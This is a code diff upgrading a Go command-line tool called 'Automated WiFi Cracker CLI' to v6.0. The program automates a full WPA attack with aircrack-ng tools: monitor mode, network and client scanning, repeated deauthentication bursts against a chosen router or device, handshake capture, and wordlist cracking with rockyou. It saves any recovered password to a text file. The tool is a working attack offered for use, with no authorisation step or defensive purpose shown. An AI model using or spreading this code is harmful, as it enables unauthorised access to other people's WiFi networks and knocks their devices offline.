@@ -55,7 +55,7 @@ func main() {
 	}
 
 	cyan.Println("=======================================")
-	cyan.Println("    Automated WiFi Cracker CLI v5.0   ")
+	cyan.Println("    Automated WiFi Cracker CLI v6.0   ")
 	cyan.Println("=======================================")
 
 	setupEnvironment()
@@ -77,15 +77,28 @@ func main() {
 	monIface = iface + "mon"
 
 	yellow.Println("\n[*] Enabling Monitor Mode...")
-	runCmd("airmon-ng", "check", "kill")
-	runCmd("airmon-ng", "start", iface)
+	// Silently run airmon-ng commands to keep CLI clean
+	runCmdSilent("airmon-ng", "check", "kill")
+	runCmdSilent("airmon-ng", "start", iface)
 	green.Println("[+] Monitor Mode enabled successfully.")
 
 	defer cleanup()
 
+	// Step 1: Scan APs
 	networks := scanNetworks()
 	target := selectTarget(networks, reader)
 
+	// Step 2: Targeted Client Scan
+	yellow.Printf("\n[*] Locking Channel %s to find connected clients for '%s' (10s)...\n", target.CH, target.ESSID)
+	target = findConnectedClients(target)
+
+	if target.Client != "" {
+		green.Printf("[+] Found connected device! MAC: %s\n", target.Client)
+	} else {
+		red.Println("[!] WARNING: No connected devices found. Broadcast deauth will be used (might fail on modern routers).")
+	}
+
+	// Step 3: Directory Structure
 	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
 	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
 	targetDir := filepath.Join("data", sanitizedEssid)
@@ -99,19 +112,21 @@ func main() {
 
 	capFile := filepath.Join(targetDir, "handshake")
 
-	// New 1-Minute Robust Handshake Capture Logic
+	// Step 4: Capture Handshake
 	captureHandshake(target, capFile)
 
-	// Final verification
+	// Step 5: Verify Handshake
 	if !verifyHandshake(capFile) {
 		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 1 minute.")
-		red.Println("[-] Reason: No device reconnected, or target router ignores deauth packets.")
+		red.Println("[-] Reason: No device reconnected, or router ignores deauth packets.")
 		red.Println("[-] Suggestion: Connect a device to this WiFi and use the internet, then run the script again.")
 		cleanup()
 		os.Exit(1)
 	}
 
 	green.Println("\n[+] Valid Handshake Captured Successfully!")
+
+	// Step 6: Crack Password
 	crackPassword(capFile, targetDir)
 	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
 }
@@ -120,8 +135,65 @@ func main() {
 // Core Attack Functions
 // ==========================================
 
+func findConnectedClients(target Network) Network {
+	scanFile := "client_scan_temp"
+	os.Remove(scanFile + "-01.csv")
+
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, monIface, "-w", scanFile, "--output-format", "csv")
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Start()
+	activeCmds = append(activeCmds, cmd)
+
+	time.Sleep(10 * time.Second) // Focused 10s scan
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+		cmd.Wait()
+	}
+
+	// Parse the focused CSV to find clients
+	file, err := os.Open(scanFile + "-01.csv")
+	if err != nil {
+		return target
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	isStation := false
+	var foundClients []string
+
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "Station MAC") {
+			isStation = true
+			continue
+		}
+
+		parts := strings.Split(line, ",")
+		if len(parts) < 6 {
+			continue
+		}
+
+		if isStation {
+			stationMac := strings.TrimSpace(parts[0])
+			targetBSSID := strings.TrimSpace(parts[5])
+			// If station is connected to our target BSSID
+			if targetBSSID == target.BSSID && stationMac != "" {
+				foundClients = append(foundClients, stationMac)
+			}
+		}
+	}
+
+	if len(foundClients) > 0 {
+		target.Client = foundClients[0] // Pick the first found client
+	}
+	os.Remove(scanFile + "-01.csv")
+	return target
+}
+
 func captureHandshake(target Network, capFile string) {
-	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 10 minutes)...")
+	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 60 seconds)...")
 
 	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
 	cmd.Stdout = nil
@@ -135,33 +207,32 @@ func captureHandshake(target Network, capFile string) {
 
 	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
 
-	// 10 Minute Loop (40 attempts, 15 seconds each)
-	for i := 1; i <= 40; i++ {
-		yellow.Printf("\n[*] Attempt %d/40: Sending Deauth Burst (Waiting 15s for reconnect)...\n", i)
+	// 1 Minute Loop (4 attempts, 15 seconds each)
+	for i := 1; i <= 4; i++ {
+		yellow.Printf("\n[*] Attempt %d/4: Sending Deauth Burst (Waiting 15s for reconnect)...\n", i)
 
-		deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
+		deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, monIface}
 		if target.Client != "" {
 			deauthArgs = append(deauthArgs, "-c", target.Client)
+			white.Printf("[*] Targeting specific client: %s\n", target.Client)
 		} else {
 			white.Println("[!] No specific client found. Sending broadcast deauth.")
 		}
 
-		// Run deauth silently in background to keep CLI clean
+		// Run deauth silently
 		deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
 		deauthCmd.Stdout = nil
 		deauthCmd.Stderr = nil
 		deauthCmd.Start()
 
-		// Wait 12 seconds for clients to reconnect and handshake to be captured
-		time.Sleep(12 * time.Second)
+		time.Sleep(12 * time.Second) // Wait for client to reconnect
 
-		// Kill deauth command if still running
 		if deauthCmd.Process != nil {
 			deauthCmd.Process.Kill()
 			deauthCmd.Wait()
 		}
 
-		// Check if handshake is already captured! If yes, break early.
+		// Check if handshake is captured early
 		if verifyHandshake(capFile) {
 			green.Println("[+] Handshake detected early! Stopping capture phase.")
 			if cmd.Process != nil {
@@ -173,7 +244,6 @@ func captureHandshake(target Network, capFile string) {
 		white.Println("[*] Handshake not found yet. Retrying...")
 	}
 
-	// Final wait to ensure file is completely written
 	time.Sleep(3 * time.Second)
 	if cmd.Process != nil {
 		cmd.Process.Kill()
@@ -184,21 +254,17 @@ func captureHandshake(target Network, capFile string) {
 
 func verifyHandshake(capFile string) bool {
 	finalCapFile := capFile + "-01.cap"
-
-	// Check if file exists first
 	if _, err := os.Stat(finalCapFile); os.IsNotExist(err) {
 		return false
 	}
 
-	// Run aircrack-ng without a wordlist just to check if handshake exists
 	cmd := exec.Command("aircrack-ng", finalCapFile)
 	var buf bytes.Buffer
 	cmd.Stdout = &buf
 	cmd.Stderr = &buf
 	cmd.Run()
 
-	outputStr := buf.String()
-	return strings.Contains(outputStr, "1 handshake")
+	return strings.Contains(buf.String(), "1 handshake")
 }
 
 func crackPassword(capFile string, targetDir string) {
@@ -209,7 +275,7 @@ func crackPassword(capFile string, targetDir string) {
 	cyan.Println("       Starting Password Cracking      ")
 	cyan.Println("=======================================")
 	yellow.Printf("[*] File: %s\n", finalCapFile)
-	yellow.Printf("[*] Wordlist: rockyou_clean.txt (Passwords < 8 chars removed)\n")
+	yellow.Printf("[*] Wordlist: rockyou_clean.txt\n")
 	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
 	fmt.Println()
 
@@ -218,7 +284,6 @@ func crackPassword(capFile string, targetDir string) {
 	var buf bytes.Buffer
 	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
 	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
-
 	cmd.Run()
 
 	outputStr := buf.String()
@@ -234,6 +299,13 @@ func crackPassword(capFile string, targetDir string) {
 				green.Println("=======================================")
 				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
 				green.Println("=======================================")
+
+				// Save password to file
+				passFilePath := filepath.Join(targetDir, "password.txt")
+				err := os.WriteFile(passFilePath, []byte("WiFi: "+filepath.Base(targetDir)+"\nPassword: "+password+"\n"), 0644)
+				if err == nil {
+					cyan.Printf("[+] Password saved securely to: %s\n", passFilePath)
+				}
 				fmt.Println()
 			}
 		}
@@ -271,7 +343,7 @@ func scanNetworks() []Network {
 
 	networks := parseCSV(scanFile + "-01.csv")
 	if len(networks) == 0 {
-		red.Println("[-] ERROR: No networks found or CSV file not generated.")
+		red.Println("[-] ERROR: No networks found.")
 		cleanup()
 		os.Exit(1)
 	}
@@ -279,7 +351,7 @@ func scanNetworks() []Network {
 	fmt.Println()
 	cyan.Println("=== Discovered WiFi Networks ===")
 	for i, net := range networks {
-		fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
+		fmt.Printf("[%d] ESSID: %-20s | BSSID: %s | CH: %-2s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
 	}
 
 	return networks
@@ -337,22 +409,15 @@ func parseCSV(filename string) []Network {
 			ch := strings.TrimSpace(parts[3])
 			sec := strings.TrimSpace(parts[5])
 			essid := strings.TrimSpace(parts[13])
-			if bssid != "" && essid != "" {
+
+			// Filter out CSV headers and empty lines
+			if bssid != "" && essid != "" && bssid != "BSSID" && essid != "ESSID" {
 				networks = append(networks, Network{
 					BSSID: bssid,
 					CH:    ch,
 					ESSID: essid,
 					Sec:   sec,
 				})
-			}
-		} else {
-			stationMac := strings.TrimSpace(parts[0])
-			targetBSSID := strings.TrimSpace(parts[5])
-			for i := range networks {
-				if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
-					networks[i].Client = stationMac
-					break
-				}
 			}
 		}
 	}
@@ -441,13 +506,14 @@ func cleanup() {
 
 	if monIface != "" {
 		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
-		runCmd("airmon-ng", "stop", monIface)
+		runCmdSilent("airmon-ng", "stop", monIface)
 	}
 
 	yellow.Println("[*] Restarting NetworkManager...")
-	runCmd("systemctl", "start", "NetworkManager")
+	runCmdSilent("systemctl", "start", "NetworkManager")
 
 	os.Remove("scan_temp-01.csv")
+	os.Remove("client_scan_temp-01.csv")
 
 	green.Println("[+] Cleanup complete.")
 }
@@ -456,5 +522,12 @@ func runCmd(name string, args ...string) {
 	cmd := exec.Command(name, args...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
+	cmd.Run()
+}
+
+func runCmdSilent(name string, args ...string) {
+	cmd := exec.Command(name, args...)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
 	cmd.Run()
 }
